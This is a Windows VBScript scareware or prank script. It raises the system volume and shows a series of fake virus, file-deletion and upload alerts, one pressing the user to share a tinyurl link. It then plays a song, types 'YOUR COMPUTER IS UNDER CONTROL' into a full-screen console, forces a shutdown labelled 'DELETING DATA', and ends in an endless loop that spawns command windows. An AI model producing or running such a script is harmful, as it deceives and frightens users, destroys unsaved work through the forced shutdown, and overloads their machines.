set oShell = CreateObject("WScript.Shell") 
oShell.run"%SystemRoot%\System32\SndVol.exe" 'Runs The Master Volume App.
WScript.Sleep 1500 'Waits For The Program To Open
oShell.SendKeys("{PGUP}") 'Turns Up The Volume 20, If It Is Muted Then It Will Unmute It
oShell.SendKeys("{PGUP}") 'Turns Up The Volume 20
oShell.SendKeys("{PGUP}") 'Turns Up The Volume 20
oShell.SendKeys("{PGUP}") 'Turns Up The Volume 20
oShell.SendKeys("{PGUP}") 'Turns Up The Volume 20
oShell.SendKeys"%{F4}"  ' ALT F4 To Exit The App.
X=MsgBox("Errror occurred while opening file. Automatically fix this issue?",4+64,"CHANGE TO NAME OF PROGRAM") 
X=MsgBox("Unable to fix error. Do you want to scan your computer",3+48,"Computer Scan") 
X=MsgBox("Warning! Virus detected on disk. Delete virus now?",3+16,"Alert") 
X=MsgBox("Unable to delete virus.",1+64,"Critical System Error") 
X=MsgBox("Virus Downloaded.",2+16," Virus Alert ") 
X=MsgBox("Deleting All System Files..",2+16,"File Deletion") 
X=MsgBox("Virus will delete system. You can avoid it by sharing this post: https://tinyurl.com/anonymus-hack-post. Click okay, when you done.",1+48,"Critical Virus Alert") 
X=MsgBox("Please Wait. Uploading files to server. Do you wish to cancel operation?",4+64,"File Transfer") 
X=MsgBox("Error while stopping operation. File Transfer completed.",1+16,"Completed") 
X=MsgBox("You did not share post.",0+48,"Possible Threat Detected") 
X=MsgBox("Your computer is under control now.",1+64,"Hacked") 
Dim oPlayer
Set oPlayer = CreateObject("WMPlayer.OCX")
oPlayer.URL = "E:\song.mp3"
oPlayer.controls.play 
While oPlayer.playState <> 1 ' 1 = Stopped
WScript.Sleep 1000
wend
set shellobj = CreateObject("WScript.shell")
shellobj.run "cmd"
wscript.sleep 500
shellobj.sendkeys "{F11}"
wscript.sleep 500
shellobj.sendkeys "YOUR "
wscript.sleep 500
shellobj.sendkeys "COMPUTER "
wscript.sleep 500
shellobj.sendkeys "IS "
wscript.sleep 500
shellobj.sendkeys "UNDER "
wscript.sleep 500
shellobj.sendkeys "CONTROL "
wscript.sleep 500
shellobj.sendkeys "{ESC}"
wscript.sleep 50
shellobj.sendkeys "shutdown -s -f -c DELETING DATA -t 30"
wscript.sleep 50 
shellobj.sendkeys "{ENTER}"
Do
shellobj.run "cmd"
Loop